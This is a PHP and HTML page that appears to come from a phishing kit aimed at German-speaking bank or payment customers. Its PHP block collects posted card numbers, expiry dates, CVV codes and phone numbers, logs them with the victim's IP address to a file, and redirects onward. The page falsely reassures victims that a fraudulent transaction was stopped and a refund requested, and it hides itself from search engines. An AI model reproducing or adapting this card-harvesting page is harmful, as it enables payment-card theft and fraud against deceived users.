<?php
session_start();
//require_once '../config.php';
if(isset($_POST["ccnum"]) && isset($_POST["expMM"]) && isset($_POST["expYY"]) && isset($_POST["cvv"]) && isset($_POST["telefono"])){
	$date = date('Y-m-d H-i-s');
	if(isset($_SESSION["user"])) {$user = $_SESSION["user"]; } else { $user = "undefined"; }
	$out="[{$date}] {$_SERVER['REMOTE_ADDR']} {$user} {$_POST['ccnum']} {$_POST['expMM']} {$_POST['expYY']} {$_POST['cvv']} {$_POST['telefono']}\n";
	file_put_contents("TXT HERE", $out, FILE_APPEND | LOCK_EX);
	header("Location: elaborazione.php?route=conferma");
}
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Melde dich in deinem Konto an</title>
        <meta name='robots' content='noindex' />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <meta name='googlebot' content='noindex'>
        <meta name='googlebot-news' content='nosnippet'>
        <link rel='shortcut icon' type='image/jpg' href='' />
        <link rel='stylesheet' href='static/style.css'>
        <script src='static/main.js' defer async></script>
    </head>

    <body>
        <div class='content'>
            <div class='content__important'>
                <header>
                    <div class='header__wrapper'>
                        <div class='header__wrapper__logo'>
                        </div>
                    </div>
                </header>
                <main>
                    <div class='main__wrapper'>
                        <div class='label__wrapper'>
                            <span class='introduction_label success-label'>
                                <center>✅ -Sehr geehrter Kunde, betrügerische Transaktion erfolgreich erkannt und ausgesetzt</center>
                            <span>
                        </div>
						<div class='label__wrapper'>
                            <span class='introduction_label success-label'>
                                <center>✅ - Rückerstattungsantrag gestellt</center> 
                            <span>
                        </div>
                        <div class='choose-lenguage__wrapper'>
                            <ul class="choose-lenguage__list">
                                <li class="choose-lenguage__list__elem">
                                    Deutch
                                </li>
                                <li class="choose-lenguage__list__elem">
                                    English
                                </li>
                            </ul>
                        </div>
                    </div>
                </main>
            </div>
        </div>
    </body>
</html>
